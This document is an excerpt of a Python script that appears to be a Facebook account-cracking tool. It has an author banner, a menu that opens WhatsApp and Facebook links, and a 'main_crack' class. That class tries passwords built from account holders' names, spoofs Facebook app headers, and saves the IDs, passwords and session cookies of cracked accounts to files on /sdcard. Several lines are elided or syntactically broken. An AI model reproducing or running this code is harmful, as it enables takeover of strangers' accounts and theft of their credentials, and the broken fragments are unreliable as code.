...
_________   __                _           
 |__   __\ \ / /               (_)          
    | |   \ V / _ __   __ _ ___ _ _ __ ___  
    | |    > < | '_ \ / _` / __| | '_ ` _ \ 
    | |   / . \| | | | (_| \__ \ | | | | | |
    |_|  /_/ \_\_| |_|\__,_|___/_|_| |_| |_|
\033[1;37m------------------------------------------------
\033[1;37m Owner   :            Md Amanullah aman Nasim
\033[1;37m Facebook:           Md Amanullah aman Nasim
\033[1;37m Github  :            TXnasim
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back Nasim Menu ")
        exit()
...
def Nasim():   
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-openhttps://wa.me/qr/QRQVJ5H5JSG7K1 )
        pass
    elif select =='F':
        os.system('xdg-open https://www.facebook.com/N404M)
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        SSB(allkey)
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Nasim] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    oks.append(sid)
                    open('/sdcard/SSB_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Nasim_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
...
def cutter():
    ...
    os.system('touch ' +nasim)
    os.system('sort -r '+nasim+' | uniq > '+nasim)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + nasim)
    print(47*'-')
    print("File Saved To :" + nasim)
    print(47*'-')
